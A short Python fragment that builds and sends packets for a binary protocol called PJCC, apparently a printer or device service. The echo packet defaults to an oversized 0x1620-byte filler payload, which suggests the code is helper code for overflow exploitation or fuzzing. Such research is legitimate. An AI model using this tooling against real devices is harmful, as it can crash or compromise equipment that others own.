import struct

class PJCC:
    ECHO = 0x1
    CHECKPASS2 = 0x83
    MAGIC_PJCC = 0xCDCA
    _pkt = None

    def __init__(self, op, payload, rep=0):
        self._pkt = struct.pack(
            ">HBBHHHIIBB",
            self.MAGIC_PJCC,
            16,  # version
            rep,
            op,
            0,
            len(payload),
            0,
            0,
            0,
            0,
        )
        self._pkt += payload

    def pkt(self):
        return self._pkt


class PJCCEcho(PJCC):
    def __init__(self, payload=b"V" * 0x1620):
        super().__init__(self.ECHO, payload)

def pjcc_send_pkt(sock, pkt, wait=False):
    sock.sendall(pkt)
    if wait:
        try:
            reply = sock.recv(0x100)
            print("received pkt", repr(reply))
        except ConnectionResetError:
            pass
